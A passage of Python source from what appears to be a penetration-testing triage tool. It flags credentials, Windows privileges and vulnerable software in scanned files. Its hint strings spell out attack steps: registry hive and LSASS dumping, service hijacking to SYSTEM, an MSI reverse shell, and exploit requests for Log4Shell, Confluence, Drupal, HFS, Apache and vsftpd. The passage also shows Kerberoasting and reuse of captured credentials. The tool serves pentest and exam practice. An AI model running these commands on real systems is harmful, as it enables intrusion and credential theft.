                        typ, val = am.group(1), am.group(2)
                        if typ == "5":
                            mode, label = "500", "Cisco type-5 (md5crypt)"
                        elif typ == "7":
                            mode, label = "", "Cisco type-7 (reversible XOR)"
                        else:
                            mode, label = "", f"Cisco type-{typ}"
                        sev = "CRITICAL" if typ == "7" else "HIGH"
                        hint = ("offline decrypt via 'ciscot7 -d <val>' (instant - reversible XOR)"
                                if typ == "7" else
                                f"hashcat -m {mode} <hash> rockyou.txt")
                        report.add(sev, "PASSWORD HASHES", path, lineno,
                                   f"{label}: {val[:40]}{'...' if len(val) > 40 else ''}",
                                   hint=hint)
                        hit = True
                        break
                    if name == "token impersonation":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeImpersonate / token-impersonation tooling reference",
                                   hint="if running as a service account: PrintSpoofer / GodPotato / JuicyPotato -> SYSTEM")
                        hit = True
                        break
                    # iter-163: high-value Windows privileges. Each maps to a
                    # distinct EoP path exam-legal for OSCP+ (no vulnerable-
                    # driver farming / no automated commercial tools).
                    if name == "SeBackupPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeBackupPrivilege - hive-save primitive available",
                                   hint="reg save HKLM\\SAM sam.hive; reg save HKLM\\SYSTEM system.hive; "
                                        "reg save HKLM\\SECURITY security.hive; "
                                        "impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL. "
                                        "On a DC: reg save NTDS.dit via ntdsutil / diskshadow -> R3D chain")
                        hit = True
                        break
                    if name == "SeRestorePrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeRestorePrivilege - registry write primitive",
                                   hint="paired w/ SeBackup for DA-track hive extract; standalone: "
                                        "modify HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc>\\ImagePath -> SYSTEM shell on restart")
                        hit = True
                        break
                    if name == "SeTakeOwnershipPrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeTakeOwnershipPrivilege - own any object then WriteDacl",
                                   hint="takeown /F <path>; icacls <path> /grant %USERNAME%:F. "
                                        "Target: services registry key, sethc.exe (sticky-keys), or admin homedir")
                        hit = True
                        break
                    if name == "SeLoadDriverPrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeLoadDriverPrivilege - unsigned driver load",
                                   hint="EDR/lab-only; OSCP+ exam-legal path is limited (BYOVD is grey-area). "
                                        "Note the priv; use only if the box docs it as intended path")
                        hit = True
                        break
                    if name == "SeManageVolumePrivilege":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "SeManageVolumePrivilege - filesystem DACL bypass",
                                   hint="run SeManageVolumeExploit to grant Full Control to C:\\ -> "
                                        "write payload to Windows\\System32\\ shim; boot -> SYSTEM")
                        hit = True
                        break
                    if name == "SeDebugPrivilege":
                        report.add("MEDIUM", "INTERESTING FILES", path, lineno,
                                   "SeDebugPrivilege - LSASS memory read",
                                   hint="rundll32 comsvcs.dll MiniDump <lsass-pid> lsass.dmp full; "
                                        "then pypykatz lsa minidump lsass.dmp. Standard on admin; "
                                        "surface flags a non-admin having it")
                        hit = True
                        break
                    if name == "SeCreateTokenPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeCreateTokenPrivilege - direct SYSTEM token forge (rare)",
                                   hint="use NtCreateToken to forge a SYSTEM primary token then "
                                        "CreateProcessWithToken. Vanishingly rare privilege; when "
                                        "present, instant SYSTEM without exploit")
                        hit = True
                        break
                    if name == "SeTcbPrivilege":
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "SeTcbPrivilege - Act as Part of the OS (tier-0)",
                                   hint="LSA-tier privilege. If a non-SYSTEM account has this, "
                                        "any LogonUser call yields a SYSTEM token")
                        hit = True
                        break
                    # ---- iter-8 round-2: operator-tool typed output ----
                    # Mimikatz/PowerView/Lazagne/cmdkey-saved/DPAPI-cred handled
                    # in _multiline_passes() (multi-line blocks); only the
                    # single-line Rubeus ticket marker is dispatched here.
                    if name == "Rubeus ticket b64":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Rubeus ticket base64 blob",
                                   hint="decode the next b64 block into .kirbi -> .ccache; export KRB5CCNAME and run Kerberos cmds")
                        hit = True
                        break
                    # Rubeus kerberoast user-bound (multi-line) -> _multiline_passes()
                    if name == "PEAS finding":
                        finding = am.group(0).strip()[:140]
                        report.add("HIGH", "RECON", path, lineno,
                                   f"PEAS finding: {finding}",
                                   hint="winPEAS/linPEAS flagged this - follow the highlighted line; check GTFOBins for the binary if SUID/sudo")
                        hit = True
                        break
                    if name == "AlwaysInstallElevated":
                        # iter-16: replaced msfvenom hint - msfvenom-generated
                        # payloads DO count toward the OSCP+ 1-target Metasploit
                        # quota even when run locally. Prefer non-MSF MSI gen so
                        # the AlwaysInstallElevated privesc costs zero MSF budget.
                        report.add("CRITICAL", "RECON", path, lineno,
                                   "AlwaysInstallElevated = 1 (SYSTEM via MSI)",
                                   hint=("non-MSF MSI: WiX (candle+light) wrapping a PowerShell/nim/Go "
                                         "reverse shell; OR write a small C# Installer-class .msi. "
                                         "Then: msiexec /quiet /qn /i evil.msi   "
                                         "(spends 0 MSF budget; msfvenom-generated payloads count toward "
                                         "the 1-target OSCP+ Metasploit limit)"))
                        hit = True
                        break
                    if name == "Snaffler red":
                        # iter-13 severity normalization: this is a PATH, not
                        # the secret content. Demote from CRITICAL to HIGH so
                        # severity matches what the operator actually got.
                        target = am.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"Snaffler red-flagged file: {target}",
                                   hint=f"read: type \"{target}\" / cat {target}  - Snaffler matched a secret-or-cred rule")
                        hit = True
                        break
                    if name == "smbmap rw share":
                        share, access = am.group(1), am.group(2)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"smbmap writable share: {share} ({access})",
                                   hint=f"smbclient //<host>/{share} -U <user>%<pw>  -> put files / NTLM-trigger SCF / WAR drop")
                        hit = True
                        break
                    if name == "kerbrute valid user":
                        u = am.group(1)
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"kerbrute valid user: {u}",
                                   hint=f"add to users.txt and AS-REPRoast / Kerberoast / password-spray that account")
                        hit = True
                        break
                    # PowerView kerb target -> _multiline_passes()
                    if name == "accesschk RW":
                        principal, target_path = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(principal) or filters.is_placeholder(target_path):
                            continue
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"writable as '{principal}': {target_path}",
                                   hint="if service binary: stop, replace, restart -> SYSTEM. If folder in PATH: drop a binary with command name")
                        hit = True
                        break
                    # cmdkey saved -> _multiline_passes()
                    if name == "PEAS sudo version":
                        ver = am.group(1)
                        try:
                            parts = [int(x) for x in ver.split('.')]
                        except ValueError:
                            continue
                        # iter-13: vulnerable-version match is HIGH (PoC still
                        # requires heap-luck + sudoedit binary present); current
                        # is INFO (just a version string for context).
                        if parts < [1, 9, 5]:
                            sev = "HIGH"
                            cve = "CVE-2021-3156 (Baron Samedit) - sudoedit -s '\\' heap overflow; verify sudoedit present + PoC compiles"
                        else:
                            sev = "INFO"
                            cve = "current - check sudo -l NOPASSWD entries"
                        report.add(sev, "RECON", path, lineno,
                                   f"sudo {ver} - {cve}",
                                   hint="if vulnerable: searchsploit CVE-2021-3156; always run sudo -l for NOPASSWD/GTFOBins")
                        hit = True
                        break
                    if name == "SUID GTFOBins":
                        # iter-13: intel-only privesc primitive (HIGH, not
                        # CRITICAL - operator still has to validate by hand)
                        # iter-215: consult _GTFOBINS_SUID for the exact
                        # escape command; fall back to the generic hint
                        # when the binary isn't tabled.
                        binary = am.group(1)
                        _bn = os.path.basename(binary)
                        _esc = _GTFOBINS_SUID.get(_bn)
                        if _esc:
                            _hint = (f"cd $(dirname {binary}); {_esc}  |  "
                                     f"ref: gtfobins.github.io/gtfobins/{_bn}")
                        else:
                            _hint = (f"gtfobins.github.io/gtfobins/{_bn} - "
                                     f"SUID section -> root")
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"SUID-root GTFOBins-able binary: {binary}",
                                   hint=_hint)
                        hit = True
                        break
                    if name == "Linux capability":
                        binary, cap = am.group(1), am.group(2)
                        # iter-13: intel-only - HIGH
                        # iter-215: consult _LINUX_CAPS for per-cap
                        # escape; fall back to python setuid recipe.
                        # iter-222: handle comma-separated multi-caps
                        # `cap_setuid,cap_setgid+ep` - the prior split
                        # yielded the whole `cap_a,cap_b` string as
                        # the lookup key so no dict entry ever matched.
                        _caps_raw = cap.split("+")[0].split("=")[0]
                        _caps_list = [c.strip() for c in _caps_raw.split(",")]
                        _cap_name = _caps_raw
                        _cap_hint = None
                        for _cn in _caps_list:
                            _cap_hint = _LINUX_CAPS.get(_cn)
                            if _cap_hint:
                                _cap_name = _cn
                                break
                        if _cap_hint:
                            _hint = (_cap_hint.replace("<bin>", binary)
                                     + f"  |  ref: /usr/sbin/capsh --decode="
                                     f"$(echo {cap} | tr -d 'eip+=')")
                        else:
                            _hint = ("cap_setuid+ep on python/perl/ruby = "
                                     "direct root: <bin> -c 'import os; "
                                     "os.setuid(0); os.system(\"/bin/bash\")'")
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"capability {cap} on {binary}",
                                   hint=_hint)
                        hit = True
                        break
                    if name == "NFS no_root_squash":
                        ex = am.group(1)
                        # iter-13: intel-only privesc primitive - HIGH
                        report.add("HIGH", "RECON", path, lineno,
                                   f"NFS export no_root_squash: {ex}",
                                   hint=f"as root locally: mount -t nfs <target>:{ex} /mnt; copy SUID-shell binary in; gain root on target")
                        hit = True
                        break
                    if name == "CobaltStrike beacon":
                        # iter-13: IOC-only intel (no cred to use). Demote to
                        # MEDIUM/RECON to match peer IOC signals.
                        c2 = am.group(1) or am.group(2) or am.group(3) or ""
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"Cobalt Strike beacon config: {c2[:60]}",
                                   hint="parse with CobaltStrikeParser / 1768.py - C2 URL/staging path/HMAC keys")
                        hit = True
                        break
                    # Lazagne cred -> _multiline_passes()
                    if name == "hashcat status":
                        rec, tot, pct = am.group(1), am.group(2), am.group(3)
                        report.add("INFO", "RECON", path, lineno,
                                   f"hashcat session: cracked {rec}/{tot} ({pct}%)",
                                   hint="check the .potfile for cracked plaintexts (we parse it)")
                        hit = True
                        break
                    # ADO.NET connectionString: parse User ID / Password out cleanly
                    if name == "ADO connectionString":
                        cs = am.group(1)
                        # Iter-7: skip Integrated Security / Trusted_Connection strings
                        # (no password to leak), and skip __VAR__/${VAR}/<TOKEN> templates.
                        cs_low = cs.lower()
                        if ("integrated security" in cs_low
                                or "trusted_connection=yes" in cs_low
                                or "trusted_connection=true" in cs_low):
                            continue
                        pm = re.search(r'(?i)\b(?:password|pwd)\s*=\s*([^;"\'\r\n]{3,})', cs)
                        um = re.search(r'(?i)\b(?:user\s*id|uid|user)\s*=\s*([^;"\'\r\n]{1,60})', cs)
                        if not pm:
                            continue
                        pw = pm.group(1).strip()
                        if (filters.is_placeholder(pw)
                                or pw.startswith('__') and pw.endswith('__')
                                or pw.startswith('${') or pw.startswith('<')):
                            continue
                        u = (um.group(1).strip() if um else "")
                        # iter-175: shell-escape u + pw.
                        _u_sh_cs = (u or "<user>").replace("'", "'\\''")
                        _pw_sh_cs = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"connstring {u + ':' if u else ''}{pw}",
                                   hint=f"DB/service cred: netexec mssql <host> -u '{_u_sh_cs}' -p '{_pw_sh_cs}' "
                                   "(or mssqlclient.py / reuse on the host)")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-9 dispatch branches ----
                    # Ansible Vault header: file-level intel marker, no value to emit
                    if name == "Ansible Vault header":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Ansible Vault AES256 encrypted blob",
                                   hint="ansible-vault decrypt <file>   - need the vault password (look in ~/.vault_pass / playbooks)")
                        hit = True
                        break
                    # Firefox logins.json: encrypted; flag the file
                    if name == "Firefox logins.json":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "Firefox logins.json (encrypted creds)",
                                   hint="firefox_decrypt.py <profile-dir>  (needs key4.db; if primary pw set: hashcat -m 26100)")
                        hit = True
                        break
                    # Browser password CSV export header
                    if name == "browser password CSV":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "browser password export CSV (name,url,user,password)",
                                   hint="cat <file>  - cleartext password rows follow the header")
                        hit = True
                        break
                    # PS PSCredential inline: 2 groups (user, pw)
                    if name == "PS PSCredential inline":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or filters.is_placeholder(u):
                            continue
                        # iter-141 + iter-176: shell-safe escape for u + pw.
                        _u_sh_psc = (u or "").replace("'", "'\\''")
                        _p_sh = (p or "").replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"PowerShell PSCredential: {u}:{p}",
                                   hint=f"reuse: netexec smb <DC-IP> -u '{_u_sh_psc}' -p '{_p_sh}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # PowerShell -enc payload: decode hint only (b64 -> UTF-16LE)
                    if name == "PowerShell -enc payload":
                        blob = am.group(1)
                        if filters.is_canonical_sample(blob):
                            continue
                        report.add("HIGH", "ENCODED/DECODED", path, lineno,
                                   f"PowerShell -EncodedCommand: {blob[:40]}...",
                                   hint="decode: echo '<b64>' | base64 -d | iconv -f UTF-16LE -t UTF-8")
                        hit = True
                        break
                    # GPP cpassword inline (32-byte AES-CBC blob)
                    # ---- iter-22 dispatch branches ----
                    if name == "Log4Shell JNDI":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Log4Shell JNDI injection (CVE-2021-44228)",
                                   hint=("verify target: nslookup test.<unique>.dnslog.cn from victim; "
                                         "manual PoC: ldap server (marshalsec) on attacker, "
                                         "${jndi:ldap://<you>:1389/<class>}; OSCP+ legal as single-target"))
                        hit = True
                        break
                    if name == "Spring4Shell classLoader":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Spring4Shell classLoader (CVE-2022-22965)",
                                   hint=("POST body params class.module.classLoader.resources.context."
                                         "parent.pipeline.first.pattern - manual exploit drops a JSP webshell "
                                         "into the tomcat webroot; verify spring-webmvc + JDK9+"))
                        hit = True
                        break
                    if name == "Confluence OGNL":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "Confluence OGNL injection (CVE-2022-26134)",
                                   hint=("curl <url>/'%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40"
                                         "toString...)%7D/' - get the response body; pre-auth RCE"))
                        hit = True
                        break
                    if name == "ProxyShell autodiscover":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "ProxyShell autodiscover SSRF (CVE-2021-34473)",
                                   hint=("autodiscover@-suffix bypass: SSRF chains to /powershell -> "
                                         "New-MailboxExportRequest webshell drop; manual exploit only"))
                        hit = True
                        break
                    if name == "ProxyLogon X-AnonResource":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "ProxyLogon X-AnonResource-Backend (CVE-2021-26855)",
                                   hint="Exchange SSRF -> /ecp + write-out CMD aspx webshell to %ProgramFiles%")
                        hit = True
                        break
                    if name == "MOVEit human2.aspx":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "MOVEit human2.aspx webshell (CVE-2023-34362)",
                                   hint=("post-SQLi webshell drop in MOVEit wwwroot - if present, "
                                         "the operator already has token-recovery; chain: GET /human2.aspx?... "
                                         "with crafted Cookie:siLockProof header"))
                        hit = True
                        break
                    if name == "TeamCity .jsp bypass":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "TeamCity ;.jsp auth bypass (CVE-2024-27198)",
                                   hint=("/app/rest/users/id:1/tokens/RPC2;.jsp - creates admin API token; "
                                         "then POST /app/rest/users with admin role"))
                        hit = True
                        break
                    if name == "NetScaler NSC_AAAC":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   "Captured NetScaler NSC_AAAC session cookie (CVE-2023-4966)",
                                   hint=("inject Cookie: NSC_AAAC=<value> into NetScaler /logon/LogonPoint/index.html "
                                         "for session hijack; if AAA enabled, this IS the admin session"))
                        hit = True
                        break
                    if name == "F5 BIG-IP iControl bypass":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "F5 BIG-IP iControl REST Connection-header bypass (CVE-2022-1388)",
                                   hint=("POST /mgmt/tm/util/bash with X-F5-Auth-Token: 0; pre-auth RCE; "
                                         "single-target OSCP+ legal"))
                        hit = True
                        break
                    if name == "GitLab pw-reset double-email":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "GitLab pw-reset double-email body (CVE-2023-7028)",
                                   hint=("POST /users/password with body 'user[email][]=victim@x&user[email][]=attacker@y' "
                                         "- victim's pw-reset link is delivered to BOTH addresses"))
                        hit = True
                        break
                    if name == "vsftpd 2.3.4 backdoor":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "INTERESTING FILES", path, lineno,
                                   "vsftpd 2.3.4 smiley backdoor (CVE-2011-2523)",
                                   hint=("login with username ending ':)' to trigger backdoor; "
                                         "then nc <host> 6200 for root shell. Manual exploit; exam-legal"))
                        hit = True
                        break
                    if name == "Samba SambaCry banner":
                        if filters.is_doc_file(path):
                            continue
                        ver = am.group(1)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"Samba {ver} - CVE-2017-7494 SambaCry (writable-share RCE)",
                                   hint=("requires writable share + path disclosure; upload .so payload, "
                                         "trigger via writeable named pipe; manual single-target"))
                        hit = True
                        break
                    if name == "Apache 2.4.49/50 traversal":
                        if filters.is_doc_file(path):
                            continue
                        report.add("HIGH", "RECON", path, lineno,
                                   "Apache 2.4.49/50 (CVE-2021-41773/42013) path traversal -> RCE",
                                   hint=("curl <url>/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd  - if mod_cgi "
                                         "enabled: ' --data 'echo;id' /cgi-bin/.%2e/.../bin/sh '"))
                        hit = True
                        break
                    if name == "HFS 2.3 RCE banner":
                        if filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "RECON", path, lineno,
                                   "HFS 2.3 (CVE-2014-6287) macro RCE",
                                   hint=("curl <url>/?search=%00{.exec|cmd.exe /c whoami.}  - macro injection "
                                         "in search param; classic HTB Optimum primitive"))
                        hit = True
                        break
                    if name == "Drupal pre-7.59/8.5.1":
                        if filters.is_doc_file(path):
                            continue
                        ver = am.group(0)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"{ver} - CVE-2018-7600 Drupalgeddon2",
                                   hint=("POST /user/register?element_parents=account/mail/%23value with "
                                         "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec; "
                                         "manual single-target"))
                        hit = True
                        break
                    # ---- iter-21 dispatch branches ----
                    if name == "GetUserSPNs CSV row":
                        plow = path.lower()
                        if not ("getuserspns" in plow or "kerberoast" in plow
                                or "spns" in plow or path.lower().endswith((".txt", ".csv", ".tsv"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        spn, user = am.group(1), am.group(2)
                        if user in seen_svc:
                            continue
                        seen_svc.add(user)
                        report.add("HIGH", "RECON", path, lineno,
                                   f"Kerberoastable user: {user}  (SPN: {spn[:50]})",
                                   hint=("impacket-GetUserSPNs <DOMAIN>/<user>:<pw> -dc-ip <dc> -request "
                                         "-outputfile tgs.txt; hashcat -m 13100 tgs.txt rockyou.txt"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="kerberoastable", user=user,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "smbmap -R sensitive file":
                        plow = path.lower()
                        if not ("smbmap" in plow or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        target = am.group(1).strip()
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"smbmap -R sensitive file: {target[:100]}",
                                   hint=("smbclient.py <user>@<host> -p '<pw>' or smbmap -H <host> "
                                         "-u <user> -p '<pw>' --download '<share>/<path>'  "
                                         "(grab the file - often a quick win on OSCP+ AD boxes)"))
                        hit = True
                        break
                    # ---- iter-20 dispatch branches ----
                    if name == "Elastix AMPDBPASS":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Elastix AMP* secret: {val}",
                                   hint=("PBX/FreePBX MySQL password - reuse on the box's root pw "
                                         "(HTB Beep pattern); mysql -u root -p'" + val + "'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "PHP bracketed array secret":
                        val = am.group(1)
                        if filters.is_placeholder(val) or filters.is_code_not_literal(val, line):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"PHP $cfg[..] secret: {val}",
                                   hint="PHP bracketed-array literal - reuse against the DB / service the config talks to")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Tomcat context Resource":
                        u, p = am.group(1), am.group(2)
                        if filters.is_placeholder(p) or p.lower() in ("changeit", "tomcat", "manager"):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"Tomcat Resource {u}:{p}",
                                   hint=("DataSource cred from context.xml - DB login: "
                                         "mysql/psql -u '" + u + "' -p'" + p + "'  (also try tomcat manager-gui)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "Tomcat keystorePass":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.lower() in ("changeit", "tomcat"):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"Tomcat keystore/truststore password: {pw}",
                                   hint=("keytool -list -v -keystore <file> -storepass '" + pw + "'  "
                                         "- extract certs; also try same pw on the Tomcat manager"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "IPSec pre-shared-key":
                        psk = am.group(1).strip()
                        if filters.is_placeholder(psk) or filters.is_doc_file(path):
                            continue
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"IPSec PSK: {psk}",
                                   hint=("PSK from pfSense/strongSwan/Cisco config - establish VPN tunnel: "
                                         "ipsec.conf + ipsec.secrets with this PSK then route to internal LAN"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=psk,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "showmount -e export":
                        # Only fire on plausibly-showmount-shaped files (not arbitrary
                        # logs that happen to have /path lines)
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        if not ("showmount" in plow or "nfs" in base or "nmap" in plow
                                or path.lower().endswith((".txt", ".log", ".nmap"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        export_path, hosts = am.group(1), am.group(2)
                        # skip noisy fs paths
                        if export_path.startswith(("/proc/", "/sys/", "/dev/", "/run/", "/tmp/")):
                            continue
                        sev = "HIGH" if hosts.strip() == "*" else "MEDIUM"
                        report.add(sev, "RECON", path, lineno,
                                   f"NFS export: {export_path}  allowed-from: {hosts}",
                                   hint=("if no_root_squash present: mount -t nfs <ip>:" + export_path +
                                         " /mnt; drop a SUID-shell binary as local root -> SUID-root on target; "
                                         "else try mount + browse for sensitive files"))
                        hit = True
                        break
                    if name == "accesschk service block":
                        plow = path.lower()
                        if not ("accesschk" in plow or "winpeas" in plow
                                or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        # capture the service name (the regex matches only the line;
                        # service name is everything after the indented RW)
                        m = re.match(r'\s*RW\s+([A-Z][A-Za-z0-9_$.]{2,40})\s*$', line)
                        if not m:
                            continue
                        svc = m.group(1)
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   f"AccessChk RW on service: {svc}",
                                   hint=("writable service permissions - sc config " + svc +
                                         " binPath= <evil>; sc start " + svc +
                                         "  (SYSTEM via service replacement)"))
                        hit = True
                        break
                    if name == "ASP.NET encrypted config":
                        report.add("HIGH", "INTERESTING FILES", path, lineno,
                                   "ASP.NET <EncryptedData> in web.config (RsaProtectedConfigurationProvider)",
                                   hint=("offline decrypt: aspnet_regiis -pdf 'connectionStrings' <site-path>  "
                                         "(needs the RSA key container - either on box or extract from "
                                         "%SystemRoot%\\Microsoft.NET\\v*\\Config\\RsaProtectedConfigurationProvider)"))
                        hit = True
                        break
                    if name == "AutoLogon DefaultUser":
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        report.add("MEDIUM", "RECON", path, lineno,
                                   f"AutoLogon default principal: {val}",
                                   hint="pair with adjacent DefaultPassword finding; that's the AutoLogon principal+pw")
                        hit = True
                        break
                    # iter-86: RDP saved session artifacts. Only fire when the
                    # file extension is .rdp (or .rdg for RDCMan) - the field
                    # syntax 'username:s:foo' / 'full address:s:foo' is
                    # unambiguous but not worth a global keyword sweep.
                    if name in ("RDP saved user", "RDP target host"):
                        _pl = path.lower()
                        if not (_pl.endswith((".rdp", ".rdg"))):
                            continue
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        if name == "RDP saved user":
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDP saved session for user: {val}",
                                       hint=("pair with the 'password 51:b:' DPAPI blob in this "
                                             ".rdp file - decrypt via impacket-dpapi credential "
                                             "using the user's masterkey (see R-DPAPI chain)"))
                        else:  # RDP target host
                            _host_only = val.split(":", 1)[0]
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDP saved target host: {val}",
                                       hint=f"the saved-cred user in this file was RDP'd to {_host_only}; try any recovered cred there")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.learn_host(names=[_host_only])
                                store.add(Evidence(kind="service", host=_host_only,
                                                    port=3389, service="rdp",
                                                    source=path, line=lineno))
                        hit = True
                        break
                    # iter-87: RDCMan .rdg XML variant - only fire on .rdg
                    # (or the special 'rdcman.settings' file), never on the
                    # thousands of other .xml/.config files that use these
                    # generic tag names (<name>, <domain>, <userName> also
                    # show up in Java Spring beans and .NET web.config).
                    if name in ("RDCMan user", "RDCMan domain", "RDCMan server"):
                        _pl = path.lower()
                        _base = os.path.basename(_pl)
                        if not (_pl.endswith(".rdg") or _base == "rdcman.settings"):
                            continue
                        val = am.group(1).strip()
                        if filters.is_placeholder(val):
                            continue
                        if name == "RDCMan user":
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDCMan saved profile user: {val}",
                                       hint=("pair with the <password> DPAPI blob in this .rdg -"
                                             " impacket-dpapi credential -key 0x<sha1> to decrypt"))
                        elif name == "RDCMan domain":
                            report.add("MEDIUM", "RECON", path, lineno,
                                       f"RDCMan saved profile domain: {val}",
                                       hint="AD domain the RDCMan profile authenticates to")
                        else:  # RDCMan server
                            report.add("HIGH", "RECON", path, lineno,
                                       f"RDCMan saved server: {val}",
                                       hint=f"target host in the operator's RDCMan file; try any recovered cred against {val}")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.learn_host(names=[val])
                                store.add(Evidence(kind="service", host=val,
                                                    port=3389, service="rdp",
                                                    source=path, line=lineno))
                        hit = True
                        break
                    if name == "GPP cpassword inline":
                        blob = am.group(1)
                        if filters.is_placeholder(blob) or filters.is_canonical_sample(blob):
                            continue
                        # iter-20: attempt deterministic decrypt via the MS-
                        # published AES key. If `cryptography` lib is installed
                        # the operator gets the plaintext directly; else we
                        # fall back to the gpp-decrypt CLI hint.
                        plain = filters.decrypt_gpp(blob)
                        if plain and not filters.is_placeholder(plain):
                            # iter-141: shell-safe escape for the hint's -p value.
                            _plain_sh = plain.replace("'", "'\\''")
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"GPP cpassword DECRYPTED: {plain}",
                                       hint=(f"plaintext recovered via published MS AES key; reuse: "
                                             f"netexec smb <DC-IP> -u '<user>' -p '{_plain_sh}' --local-auth"))
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", plaintext=plain,
                                                   source=path, line=lineno))
                        else:
                            report.add("CRITICAL", "GPP cpassword", path, lineno,
                                       f"GPP cpassword blob: {blob[:30]}...",
                                       hint="gpp-decrypt '" + blob + "'   (fixed AES key MS published - cleartext on stdout)")
                        hit = True
                        break
                    # Splunk authentication.conf hashed admin password
                    if name == "Splunk authentication":
                        h = am.group(1)
                        report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                   f"Splunk admin sha512crypt: {h[:30]}...",
                                   hint="hashcat -m 1800 splunk.hash rockyou.txt")
